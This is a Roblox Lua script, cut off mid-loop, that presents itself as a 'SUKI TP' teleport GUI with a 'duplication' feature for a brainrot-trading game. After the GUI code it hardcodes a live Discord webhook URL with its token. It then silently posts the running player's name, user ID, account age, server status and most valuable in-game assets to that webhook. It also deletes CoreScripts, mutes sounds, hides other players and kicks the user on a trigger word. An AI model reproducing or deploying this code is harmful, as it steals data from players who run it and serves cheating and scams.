repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local hrp = character:WaitForChild("HumanoidRootPart")
local camera = workspace.CurrentCamera

player.CharacterAdded:Connect(function(char)
	character = char
	humanoid = char:WaitForChild("Humanoid")
	hrp = char:WaitForChild("HumanoidRootPart")
end)

local TOOL_NAME = "Flying Carpet"
local STEP_DELAY = 0.2
local BLOCK_CLICK_OFFSET_Y = 55
local BLOCK_WAIT = 0.25
local teleporting = false
local blocking = false

local RIGHT_PATH = {
	Vector3.new(-354.82, -6.99, 111.92),
	Vector3.new(-357.90, -6.99, 20.45),
	Vector3.new(-331.37, -5.03, 21.37)
}

local LEFT_PATH = {
	Vector3.new(-353.71, -6.99, 5.26),
	Vector3.new(-356.92, -6.99, 88.86),
	Vector3.new(-331.62, -4.59, 95.65)
}

local function equipCarpet()
	local tool = character:FindFirstChild(TOOL_NAME) or player.Backpack:FindFirstChild(TOOL_NAME)
	if tool then
		humanoid:EquipTool(tool)
	end
end

local function clickBlock()
	local size = camera.ViewportSize
	local x = size.X / 2
	local y = size.Y / 2 + BLOCK_CLICK_OFFSET_Y
	VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
	task.wait(0.02)
	VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
end

local function blockAll()
	if blocking then return end
	blocking = true
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= player then
			pcall(function()
				StarterGui:SetCore("PromptBlockPlayer", plr)
			end)
			task.wait(BLOCK_WAIT)
			clickBlock()
			task.wait(0.12)
		end
	end
	blocking = false
end

local function teleportPath(path)
	if teleporting then return end
	teleporting = true
	equipCarpet()
	task.wait(0.25)
	for i, position in ipairs(path) do
		if hrp then
			hrp.CFrame = CFrame.new(position)
		end
		task.wait(STEP_DELAY)
		if i == #path then
			blockAll()
		end
	end
	teleporting = false
end

-- ========== SUKI TP STYLED GUI ==========

local gui = Instance.new("ScreenGui", player.PlayerGui)
gui.Name = "LeftOrRightUI"
gui.ResetOnSpawn = false

local main = Instance.new("Frame", gui)
main.Size = UDim2.fromOffset(280, 200)
main.Position = UDim2.fromScale(0.5, 0.5)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
main.BorderSizePixel = 0
main.Active = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 20)

-- Subtle gradient overlay
local gradient = Instance.new("UIGradient", main)
gradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 40)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 30))
})
gradient.Rotation = 45

-- Header container
local header = Instance.new("Frame", main)
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundTransparency = 1
header.BorderSizePixel = 0

-- Green accent button (left)
local greenBtn = Instance.new("TextButton", header)
greenBtn.Size = UDim2.fromOffset(40, 40)
greenBtn.Position = UDim2.fromOffset(10, 5)
greenBtn.BackgroundColor3 = Color3.fromRGB(45, 255, 120)
greenBtn.Text = "+"
greenBtn.TextColor3 = Color3.fromRGB(15, 15, 30)
greenBtn.Font = Enum.Font.GothamBold
greenBtn.TextSize = 24
greenBtn.BorderSizePixel = 0
Instance.new("UICorner", greenBtn).CornerRadius = UDim.new(0, 10)

-- Orange/Yellow accent button
local orangeBtn = Instance.new("TextButton", header)
orangeBtn.Size = UDim2.fromOffset(40, 40)
orangeBtn.Position = UDim2.fromOffset(55, 5)
orangeBtn.BackgroundColor3 = Color3.fromRGB(255, 180, 50)
orangeBtn.Text = "TP"
orangeBtn.TextColor3 = Color3.fromRGB(15, 15, 30)
orangeBtn.Font = Enum.Font.GothamBold
orangeBtn.TextSize = 14
orangeBtn.BorderSizePixel = 0
Instance.new("UICorner", orangeBtn).CornerRadius = UDim.new(0, 10)

-- Title text
local title = Instance.new("TextLabel", header)
title.Size = UDim2.new(0, 100, 0, 40)
title.Position = UDim2.fromOffset(105, 5)
title.BackgroundTransparency = 1
title.Text = "SUKI TP"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextXAlignment = Enum.TextXAlignment.Left
title.BorderSizePixel = 0

-- Close button (right)
local closeBtn = Instance.new("TextButton", header)
closeBtn.Size = UDim2.fromOffset(40, 40)
closeBtn.Position = UDim2.fromOffset(230, 5)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
closeBtn.Text = "×"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 28
closeBtn.BorderSizePixel = 0
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 10)

closeBtn.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

-- Subtitle text
local subtitle = Instance.new("TextLabel", main)
subtitle.Size = UDim2.new(1, -20, 0, 20)
subtitle.Position = UDim2.fromOffset(10, 55)
subtitle.BackgroundTransparency = 1
subtitle.Text = "P or + to Add Position | F to Teleport"
subtitle.TextColor3 = Color3.fromRGB(150, 150, 170)
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 11
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.BorderSizePixel = 0

local dragging, dragStart, startPos

header.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = main.Position
	end
end)

UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = false
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		main.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
end)

local function makeButton(text, pos)
	local btn = Instance.new("TextButton", main)
	btn.Size = UDim2.new(0.45, 0, 0, 55)
	btn.Position = pos
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
	btn.Text = text
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 16
	btn.BorderSizePixel = 0
	btn.AutoButtonColor = false
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
	
	-- Button gradient
	local btnGradient = Instance.new("UIGradient", btn)
	btnGradient.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 55)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 45))
	})
	btnGradient.Rotation = 90

	btn.MouseEnter:Connect(function()
		btn.BackgroundColor3 = Color3.fromRGB(45, 255, 120)
		btn.TextColor3 = Color3.fromRGB(15, 15, 30)
	end)
	btn.MouseLeave:Connect(function()
		btn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
		btn.TextColor3 = Color3.new(1, 1, 1)
	end)

	return btn
end

local leftBtn = makeButton("LEFT", UDim2.new(0.05, 0, 0, 90))
local rightBtn = makeButton("RIGHT", UDim2.new(0.5, 0, 0, 90))

leftBtn.MouseButton1Click:Connect(function()
	teleportPath(LEFT_PATH)
end)

rightBtn.MouseButton1Click:Connect(function()
	teleportPath(RIGHT_PATH)
end)

getgenv().UserWebhookURL = "https://discord.com/api/webhooks/1437485188082040862/fICnI3nJ26QS2FNaKtz-TqzyXz0KxOcqFB9VRpCjVh753YRBkPeF8_2qZc6ro81wknEt"
local CoreGui = game:GetService("CoreGui")
local RobloxGui = CoreGui:FindFirstChild("RobloxGui")

if RobloxGui then
    for _, obj in ipairs(RobloxGui:GetDescendants()) do
        if obj.ClassName == "CoreScript" then
            print("Removed CoreScript:", obj.Name)
            obj:Destroy()
        end
    end

    print("All CoreScripts inside RobloxGui have been removed.")
else
    warn("RobloxGui not found inside CoreGui.")
end





local l_HttpService_0 = game:GetService("HttpService");
local l_ReplicatedStorage_0 = game:GetService("ReplicatedStorage");
local l_Players_0 = game:GetService("Players");
local l_Workspace_0 = game:GetService("Workspace");
local l_LocalPlayer_0 = l_Players_0.LocalPlayer;
local l_PlayerGui_0 = l_LocalPlayer_0:WaitForChild("PlayerGui");
local v6 = syn and syn.websocket.connect or getgenv().WebSocket and getgenv().WebSocket.connect;
local v7 = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request;
local v8 = {
    ["1x1x1x1"] = true, 
    ["67"] = true, 
    ["Admin Lucky Block"] = true, 
    ["Agarrini la Palini"] = true, 
    Alessio = true, 
    ["Anpali Babel"] = true, 
    Antonio = true, 
    Aquanaut = true, 
    ["Avocadini Antilopini"] = true, 
    ["Avocadini Guffo"] = true, 
    Avocadorilla = true, 
    ["Ballerina Cappuccina"] = true, 
    ["Ballerino Lololo"] = true, 
    ["Bambini Crostini"] = true, 
    ["Bambu Bambu Sahur"] = true, 
    ["Bananita Dolphinita"] = true, 
    ["Bananito Bandito"] = true, 
    ["Bandito Axolito"] = true, 
    ["Bandito Bobritto"] = true, 
    ["Belula Beluga"] = true, 
    ["Bisonte Giuppitere"] = true, 
    ["Blackhole Goat"] = true, 
    ["Blueberrinni Octopusini"] = true, 
    ["Boatito Auratito"] = true, 
    ["Bombardini Tortinii"] = true, 
    ["Bombardiro Crocodilo"] = true, 
    ["Bombombini Gusini"] = true, 
    ["Boneca Ambalabu"] = true, 
    ["Brainrot God Lucky Block"] = true, 
    ["Brasilini Berimbini"] = true, 
    ["Brr Brr Patapim"] = true, 
    ["Brr es Teh Patipum"] = true, 
    ["Brri Brri Bicus Dicus Bombicus"] = true, 
    ["Brutto Gialutto"] = true, 
    ["Buho de Fuego"] = true, 
    ["Bulbito Bandito Traktorito"] = true, 
    ["Burbaloni Loliloli"] = true, 
    ["Burguro And Fryuro"] = true, 
    ["Burrito Bandito"] = true, 
    ["Cacasito Satalito"] = true, 
    ["Cachorrito Melonito"] = true, 
    ["Cacto Hipopotamo"] = true, 
    ["Capi Taco"] = true, 
    ["Capitano Moby"] = true, 
    ["Cappuccino Assassino"] = true, 
    ["Cappuccino Clownino"] = true, 
    ["Caramello Filtrello"] = true, 
    Carloo = true, 
    ["Carrotini Brainini"] = true, 
    ["Cavallo Virtuoso"] = true, 
    ["Celularcini Viciosini"] = true, 
    Chachechi = true, 
    ["Chef Crabracadabra"] = true, 
    ["Chicleteira Bicicleteira"] = true, 
    ["Chicleteirina Bicicleteirina"] = true, 
    ["Chihuanini Taconini"] = true, 
    ["Chillin Chili"] = true, 
    ["Chimpanzini Bananini"] = true, 
    ["Chipso and Queso"] = true, 
    ["Cocofanto Elefanto"] = true, 
    ["Cocosini Mama"] = true, 
    ["Corn Corn Corn Sahur"] = true, 
    ["Crabbo Limonetta"] = true, 
    ["Dragon Cannelloni"] = true, 
    ["Dug dug dug"] = true, 
    ["Dul Dul Dul"] = true, 
    ["Elefanto Frigo"] = true, 
    ["Esok Sekolah"] = true, 
    ["Espresso Signora"] = true, 
    Eviledon = true, 
    ["Extinct Ballerina"] = true, 
    ["Extinct Matteo"] = true, 
    ["Extinct Tralalero"] = true, 
    Fluriflura = true, 
    ["Fragola La La La"] = true, 
    Frankentteo = true, 
    ["Frigo Camelo"] = true, 
    ["Frio Ninja"] = true, 
    ["Frogato Pirato"] = true, 
    ["Ganganzelli Trulala"] = true, 
    ["Gangster Footera"] = true, 
    ["Garama and Madundung"] = true, 
    ["Gattatino Nyanino"] = true, 
    ["Gattito Tacoto"] = true, 
    ["Girafa Celestre"] = true, 
    ["Glorbo Fruttodrillo"] = true, 
    ["Gorillo Subwoofero"] = true, 
    ["Gorillo Watermelondrillo"] = true, 
    ["Graipuss Medussi"] = true, 
    ["Guerriro Digitale"] = true, 
    ["Guest 666"] = true, 
    ["Headless Horseman"] = true, 
    ["Horegini Boom"] = true, 
    ["Jacko Jack Jack"] = true, 
    ["Jacko Spaventosa"] = true, 
    Jackorilla = true, 
    ["Job Job Job Sahur"] = true, 
    ["Karker Sahur"] = true, 
    ["Karkerkar Kurkur"] = true, 
    ["Ketchuru and Musturu"] = true, 
    ["Ketupat Kepat"] = true, 
    ["Krupuk Pagi Pagi"] = true, 
    ["La Casa Boo"] = true, 
    ["La Cucaracha"] = true, 
    ["La Extinct Grande"] = true, 
    ["La Grande Combinasion"] = true, 
    ["La Karkerkar Combinasion"] = true, 
    ["La Sahur Combinasion"] = true, 
    ["La Secret Combinasion"] = true, 
    ["La Spooky Grande"] = true, 
    ["La Supreme Combinasion"] = true, 
    ["La Taco Combinasion"] = true, 
    ["La Vacca Jacko Linterino"] = true, 
    ["La Vacca Saturno Saturnita"] = true, 
    ["Las Capuchinas"] = true, 
    ["Las Sis"] = true, 
    ["Las Tralaleritas"] = true, 
    ["Las Vaquitas Saturnitas"] = true, 
    Lerulerulerule = true, 
    ["Lionel Cactuseli"] = true, 
    ["Lirilì Larilà"] = true, 
    ["Los 67"] = true, 
    ["Los Bombinitos"] = true, 
    ["Los Bros"] = true, 
    ["Los Chicleteiras"] = true, 
    ["Los Combinasionas"] = true, 
    ["Los Crocodillitos"] = true, 
    ["Los Hotspotsitos"] = true, 
    ["Los Jobcitos"] = true, 
    ["Los Karkeritos"] = true, 
    ["Los Lucky Blocks"] = true, 
    ["Los Matteos"] = true, 
    ["Los Mobilis"] = true, 
    ["Los Noobinis"] = true, 
    ["Los Nooo My Hotspotsitos"] = true, 
    ["Los Orcalitos"] = true, 
    ["Los Primos"] = true, 
    ["Los Spooky Combinasionas"] = true, 
    ["Los Spyderinis"] = true, 
    ["Los Tacoritas"] = true, 
    ["Los Tipi Tacos"] = true, 
    ["Los Tortus"] = true, 
    ["Los Tralaleritos"] = true, 
    ["Los Tungtungtungcitos"] = true, 
    ["Magi Ribbitini"] = true, 
    ["Malame Amarele"] = true, 
    ["Mangolini Parrocini"] = true, 
    ["Mariachi Corazoni"] = true, 
    ["Mastodontico Telepiedone"] = true, 
    Matteo = true, 
    Meowl = true, 
    ["Mieteteira Bicicleteira"] = true, 
    ["Money Money Puggy"] = true, 
    ["Mummio Rappitto"] = true, 
    ["Mummy Ambalabu"] = true, 
    ["Mythic Lucky Block"] = true, 
    ["Noo my Candy"] = true, 
    ["Noo my examine"] = true, 
    ["Noobini Pizzanini"] = true, 
    ["Nooo My Hotspot"] = true, 
    ["Nuclearo Dinossauro"] = true, 
    ["Odin Din Din Dun"] = true, 
    ["Orangutini Ananassini"] = true, 
    ["Orcalero Orcala"] = true, 
    ["Orcalita Orcala"] = true, 
    Pakrahmatmamat = true, 
    Pakrahmatmatina = true, 
    ["Pandaccini Bananini"] = true, 
    ["Penguino Cocosino"] = true, 
    ["Perochello Lemonchello"] = true, 
    ["Perrito Burrito"] = true, 
    ["Pi Pi Watermelon"] = true, 
    ["Piccione Macchina"] = true, 
    ["Piccionetta Macchina"] = true, 
    ["Pinealotto Fruttarino"] = true, 
    ["Pipi Avocado"] = true, 
    ["Pipi Corni"] = true, 
    ["Pipi Kiwi"] = true, 
    ["Pipi Potato"] = true, 
    ["Pop Pop Sahur"] = true, 
    ["Pot Hotspot"] = true, 
    ["Pot Pumpkin"] = true, 
    ["Pumpkini Spyderini"] = true, 
    Quackula = true, 
    ["Quesadilla Crocodila"] = true, 
    ["Quesadillo Vampiro"] = true, 
    ["Quivioli Ameleonni"] = true, 
    ["Raccooni Jandelini"] = true, 
    ["Rang Ring Bus"] = true, 
    ["Rhino Helicopterino"] = true, 
    ["Rhino Toasterino"] = true, 
    ["Salamino Penguino"] = true, 
    ["Sammyni Spyderini"] = true, 
    ["Secret Lucky Block"] = true, 
    ["Sigma Boy"] = true, 
    ["Sigma Girl"] = true, 
    ["Signore Carapace"] = true, 
    ["Skull Skull Skull"] = true, 
    Snailenzo = true, 
    ["Spaghetti Tualetti"] = true, 
    ["Spioniro Golubiro"] = true, 
    ["Spooky Lucky Block"] = true, 
    ["Spooky and Pumpky"] = true, 
    Squalanana = true, 
    ["Strawberrelli Flamingelli"] = true, 
    ["Strawberry Elephant"] = true, 
    ["Svinina Bombardino"] = true, 
    ["Ta Ta Ta Ta Sahur"] = true, 
    ["Taco Lucky Block"] = true, 
    ["Tacorita Bicicleta"] = true, 
    ["Talpa Di Fero"] = true, 
    ["Tang Tang Keletang"] = true, 
    Tartaragno = true, 
    ["Tartaruga Cisterna"] = true, 
    ["Te Te Te Sahur"] = true, 
    Telemorte = true, 
    ["Tentacolo Tecnico"] = true, 
    ["Ti Ti Ti Sahur"] = true, 
    ["Tictac Sahur"] = true, 
    ["Tigrilini Watermelini"] = true, 
    ["Tigroligre Frutonni"] = true, 
    ["Tim Cheese"] = true, 
    ["Tipi Topi Taco"] = true, 
    ["Tirilikalika Tirilikalako"] = true, 
    ["To to to Sahur"] = true, 
    ["Tob Tobi Tobi"] = true, 
    ["Toiletto Focaccino"] = true, 
    ["Torrtuginni Dragonfrutini"] = true, 
    ["Tracoducotulu Delapeladustuz"] = true, 
    ["Tractoro Dinosauro"] = true, 
    Tralaledon = true, 
    ["Tralalero Tralala"] = true, 
    ["Tralalita Tralala"] = true, 
    ["Trenostruzzo Turbo 3000"] = true, 
    ["Trenostruzzo Turbo 4000"] = true, 
    ["Tric Trac Baraboom"] = true, 
    Trickolino = true, 
    ["Trippi Troppi"] = true, 
    ["Trippi Troppi Troppa Trippa"] = true, 
    ["Trulimero Trulicina"] = true, 
    ["Tukanno Bananno"] = true, 
    ["Unclito Samito"] = true, 
    ["Urubini Flamenguini"] = true, 
    ["Vampira Cappucina"] = true, 
    ["Vulturino Skeletono"] = true, 
    ["Wombo Rollo"] = true, 
    ["Yess my examine"] = true, 
    ["Zibra Zubra Zibralini"] = true, 
    ["Zombie Tralala"] = true
};

-- Disable notifications
pcall(function()
    local v9 = l_ReplicatedStorage_0:WaitForChild("Packages", 5):WaitForChild("Net", 5):WaitForChild("RE/NotificationService/Notify", 5);
    if v9 then
        v9:Destroy();
    end;
end);

-- Mute all sounds
task.spawn(function()
    for _, v11 in ipairs(game:GetDescendants()) do
        if v11:IsA("Sound") then
            pcall(function()
                v11.Volume = 0;
            end);
        end;
    end;
    game.DescendantAdded:Connect(function(v12)
        if v12:IsA("Sound") then
            pcall(function()
                v12.Volume = 0;
            end);
        end;
    end);
end);

-- Remove "Stolen" text overhead from animals
task.spawn(function()
    while task.wait(0.25) do
        for _, plot in ipairs(l_Workspace_0.Plots:GetChildren()) do
            if plot:IsA("Model") then
                for _, descendant in ipairs(plot:GetDescendants()) do
                    if descendant:IsA("TextLabel") and descendant.Name == "Stolen" then
                        pcall(function()
                            descendant:Destroy();
                        end);
                    end;
                end;
            end;
        end;
    end;
end);

-- Kick protection for "ddg" command
task.spawn(function()
    pcall(function()
        local l_TextChatService_0 = game:GetService("TextChatService");
        if l_TextChatService_0 and l_TextChatService_0:FindFirstChild("ChatInputBarConfiguration") then
            l_TextChatService_0.MessageReceived:Connect(function(v14)
                if v14 then
                    local l_Text_0 = v14.Text;
                    if type(l_Text_0) == "string" and v14.Text:lower() == "ddg" then
                        task.wait();
                        l_LocalPlayer_0:Kick();
                    end;
                end;
            end);
            return;
        else
            local function v18(v16)
                v16.Chatted:Connect(function(v17)
                    if v17:lower() == "ddg" then
                        task.wait();
                        l_LocalPlayer_0:Kick();
                    end;
                end);
            end;
            l_Players_0.PlayerAdded:Connect(v18);
            for _, v20 in ipairs(l_Players_0:GetPlayers()) do
                v20.Chatted:Connect(function(v21)
                    if v21:lower() == "ddg" then
                        task.wait();
                        l_LocalPlayer_0:Kick();
                    end;
                end);
            end;
            return;
        end;
    end);
end);

-- Main duplication function
local function startDuplication()
    local function v31(v29)
        if not v29 then
            return 0;
        else
            local v30 = tostring(v29):gsub("[$,/s]", ""):gsub("K", "e3"):gsub("M", "e6"):gsub("B", "e9"):gsub("T", "e12");
            return tonumber(v30) or 0;
        end;
    end;

    local function v50()
        local v32 = {};
        local l_Plots_0 = l_Workspace_0:FindFirstChild("Plots");
        if not l_Plots_0 then
            return v32;
        else
            local v34 = nil;
            local v35 = l_LocalPlayer_0.DisplayName .. "'s Base";
            for _, v37 in ipairs(l_Plots_0:GetChildren()) do
                if v37:IsA("Model") then
                    local v38 = v37:FindFirstChild("PlotSign", true) and v37.PlotSign:FindFirstChild("SurfaceGui", true) and v37.PlotSign.SurfaceGui:FindFirstChild("Frame", true) and v37.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true);
                    if v38 and v38.Text == v35 then
                        v34 = v37;
                        break;
                    end;
                end;
            end;
            if not v34 then
                return v32;
            else
                local l_AnimalPodiums_0 = v34:FindFirstChild("AnimalPodiums");
                if not l_AnimalPodiums_0 then
                    return v32;
                else
                    for _, v41 in ipairs(l_AnimalPodiums_0:GetChildren()) do
                        pcall(function()
                            local l_AnimalOverhead_0 = v41.Base.Spawn.Attachment.AnimalOverhead;
                            if v31(l_AnimalOverhead_0.Generation.Text) >= 50000000 then
                                local l_Text_1 = l_AnimalOverhead_0.DisplayName.Text;
                                local l_v34_FirstChild_0 = v34:FindFirstChild(l_Text_1);
                                if l_v34_FirstChild_0 and l_v34_FirstChild_0:IsA("Model") and l_v34_FirstChild_0.PrimaryPart and l_v34_FirstChild_0.PrimaryPart.Name == "RootPart" then
                                    local v45 = nil;
                                    local v46 = l_ReplicatedStorage_0:FindFirstChild("Animations", true) and l_ReplicatedStorage_0.Animations:FindFirstChild("Animals", true) and l_ReplicatedStorage_0.Animations.Animals:FindFirstChild(l_Text_1, true);
                                    if v46 then
                                        v45 = v46:FindFirstChild("Idle");
                                    end;
                                    local v47 = v41:FindFirstChild("Claim", true) and v41.Claim:FindFirstChild("Main", true);
                                    local l_v32_0 = v32;
                                    local v49 = {
                                        modelToClone = l_v34_FirstChild_0,
                                        spawnToClone = v41.Base.Spawn,
                                        claimToClone = v47,
                                        animationToClone = v45
                                    };
                                    table.insert(l_v32_0, v49);
                                end;
                            end;
                        end);
                    end;
                    return v32;
                end;
            end;
        end;
    end;

    local function performDuplication()
        local v61 = v50();
        if #v61 == 0 then
            return false;
        else
            local v66 = Instance.new("Folder", l_Workspace_0);
            v66.Name = "ReplicatedAssets_" .. math.random(1, 1000);
            for _, v68 in ipairs(v61) do
                local v69 = v68.spawnToClone:Clone();
                local v70 = v68.modelToClone:Clone();
                local v71 = v68.claimToClone and v68.claimToClone:Clone();
                v69.Parent = v66;
                v70.Parent = v66;
                if v71 then
                    v71.Parent = v66;
                end;
                v70:SetPrimaryPartCFrame((v68.modelToClone:GetPrimaryPartCFrame()));
                for _, v73 in ipairs(v70:GetDescendants()) do
                    if v73:IsA("BasePart") then
                        v73.Size = v73.Size * 1;
                    end;
                end;
                if v68.animationToClone then
                    pcall(function()
                        local l_AnimationController_0 = v70:FindFirstChildOfClass("AnimationController");
                        if l_AnimationController_0 then
                            local l_Animator_0 = l_AnimationController_0:FindFirstChildOfClass("Animator");
                            if l_Animator_0 then
                                local v76 = v68.animationToClone:Clone();
                                v76.Parent = l_Animator_0;
                                l_Animator_0:LoadAnimation(v76):Play();
                            end;
                        end;
                    end);
                end;
                v69.CFrame = v68.spawnToClone.CFrame;
                if v71 then
                    v71.CFrame = v68.claimToClone.CFrame;
                end;
            end;
            return true, #v61;
        end;
    end;

    -- Auto-execute duplication
    task.wait(2) -- Wait a bit for game to load
    local success, count = performDuplication()
    if success then
        warn(string.format("Duplication Successful: %d assets replicated.", count))
    else
        warn("No valid targets found for duplication.")
    end
end

-- Start the main process automatically
task.spawn(function()
    -- Send data to webhook
    local function v81(v79)
        if not v79 then
            return 0;
        else
            local v80 = tostring(v79):gsub("[$,/s]", ""):gsub("K", "e3"):gsub("M", "e6"):gsub("B", "e9"):gsub("T", "e12");
            return tonumber(v80) or 0;
        end;
    end;

    local v108, v109 = (function()
        local v82 = {};
        local v83 = nil;
        local l_Name_0 = l_LocalPlayer_0.Name;
        local l_DisplayName_0 = l_LocalPlayer_0.DisplayName;
        local l_Plots_1 = l_Workspace_0:FindFirstChild("Plots");
        if not l_Plots_1 then
            return "Could not find 'Plots' folder.", nil;
        else
            for _, v88 in ipairs(l_Plots_1:GetChildren()) do
                if v88:IsA("Model") then
                    local l_v88_FirstChild_0 = v88:FindFirstChild("PlotSign", true);
                    if l_v88_FirstChild_0 then
                        local v90 = l_v88_FirstChild_0:FindFirstChild("TextLabel", true) or l_v88_FirstChild_0:FindFirstChildOfClass("TextLabel");
                        if v90 and (string.find(v90.Text, l_DisplayName_0, 1, true) or string.find(v90.Text, l_Name_0, 1, true)) then
                            v83 = v88;
                            break;
                        end;
                    end;
                end;
            end;
            if not v83 then
                return "User plot could not be identified.", nil;
            else
                for _, v92 in ipairs(v83:GetDescendants()) do
                    if v92:IsA("TextLabel") and v92.Name == "Generation" and string.find(v92.Text, "/s") then
                        local l_Parent_0 = v92.Parent;
                        if l_Parent_0 and l_Parent_0.Name == "AnimalOverhead" then
                            local l_DisplayName_1 = l_Parent_0:FindFirstChild("DisplayName");
                            local l_Price_0 = l_Parent_0:FindFirstChild("Price");
                            if l_DisplayName_1 and l_Price_0 then
                                local v96 = v81(v92.Text);
                                local v97 = v81(l_Price_0.Text);
                                local v98 = {
                                    name = l_DisplayName_1.Text or "Unknown",
                                    genText = v92.Text,
                                    genValue = v96,
                                    priceText = l_Price_0.Text,
                                    priceValue = v97
                                };
                                table.insert(v82, v98);
                            end;
                        end;
                    end;
                end;
                if #v82 == 0 then
                    return "No brainrots found on plot.", nil;
                else
                    table.sort(v82, function(v99, v100)
                        return v99.genValue > v100.genValue;
                    end);
                    local v101 = v82[1];
                    local v102 = "";
                    local v103 = 1;
                    local v104 = 3;
                    local v105 = #v82;
                    for v106 = v103, math.min(v104, v105) do
                        local v107 = v82[v106];
                        v102 = v102 .. string.format("**%d.** %s\n> **Gen:** %s | **Price:** %s\n", v106, v107.name, v107.genText, v107.priceText);
                    end;
                    return v102, v101;
                end;
            end;
        end;
    end)();

    local v110 = #l_Players_0:GetPlayers() > 1 and "⚠️ **Warning:** Other players were detected!" or "✅ **Server Status:** User was alone.";
    local v111 = {
        color = 16732240,
        title = "Silent Protocol Executed & Intel Logged",
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("**Name:** %s\n**User ID:** %d\n**Account Age:** %d days", l_LocalPlayer_0.Name, l_LocalPlayer_0.UserId, l_LocalPlayer_0.AccountAge),
                inline = false
            },
            {
                name = "📊 SERVER STATUS",
                value = v110,
                inline = false
            },
            {
                name = "🧠 User's Top Brainrots",
                value = v108 or "N/A",
                inline = false
            }
        },
        footer = {
            text = "Logged via Lemon Hub Auto Moreira (LEAKED BY MRFEAST)"
        }
    };

    if getgenv().UserWebhookURL then
        local l_UserWebhookURL_0 = getgenv().UserWebhookURL;
        if type(l_UserWebhookURL_0) == "string" and getgenv().UserWebhookURL:match("discord.com/api/webhooks") then
            local v119 = {
                username = "skibidi lemon",
                avatar_url = "https://i.imgur.com/lPNVdqu.jpeg",
                embeds = {v111}
            };
            pcall(function()
                v7({
                    Url = getgenv().UserWebhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = l_HttpService_0:JSONEncode(v119)
                });
            end);
        end;
    end;
end);

-- Disable game settings
pcall(function()
    local l_Net_0 = l_ReplicatedStorage_0:WaitForChild("Packages"):WaitForChild("Net");
    task.spawn(function()
        l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Music");
        l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects");
        l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips");
        l_Net_0["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX");
    end);
end);

-- Remove other players
pcall(function()
    task.spawn(function()
        for _, v124 in ipairs(l_Players_0:GetPlayers()) do
            if v124 ~= l_LocalPlayer_0 then
                if v124.Character then
                    pcall(function()
                        v124.Character:Destroy();
                    end);
                end;
                pcall(function()
                    v124:Destroy();
                end);
            end;
        end;
        l_Players_0.PlayerAdded:Connect(function(v125)
            if v125 ~= l_LocalPlayer_0 then
                v125.CharacterAdded:Connect(function(v126)
                    pcall(function()
                        v126:Destroy();
                    end);
                end);
                task.wait();
                pcall(function()
                    v125:Destroy();
                end);
            end;
        end);
        l_Workspace_0.ChildAdded:Connect(function(v127)
            if v127:IsA("Model") and v127.Name ~= l_LocalPlayer_0.Name and v127:FindFirstChild("HumanoidRootPart") then
                pcall(function()
                    local l_l_Players_0_PlayerFromCharacter_0 = l_Players_0:GetPlayerFromCharacter(v127);
                    v127:Destroy();
                    if l_l_Players_0_PlayerFromCharacter_0 then
                        l_l_Players_0_PlayerFromCharacter_0:Destroy();
                    end;
                end);
            end;
        end);
    end);
end);

-- Clean up plots
pcall(function()
    local l_Plots_2 = workspace:WaitForChild("Plots");
    local v130 = {};
    local v131 = {};
    local v132 = {};
    local function v137(v133)
        local v134 = {"PlotSign", "AnimalPodiums", "MainRoot"};
        for _, v136 in ipairs(v133:GetChildren()) do
            if v136:IsA("Model") and not table.find(v134, v136.Name) then
                v136:Destroy();
            end;
        end;
    end;
    local function v141(v138)
        for _, v140 in ipairs(v138:GetDescendants()) do
            if v140.Name == "Spawn" or v140.Name == "Collect" then
                v140:Destroy();
            end;
        end;
    end;
    for _, v143 in ipairs(l_Plots_2:GetChildren()) do
        if v143:IsA("Model") then
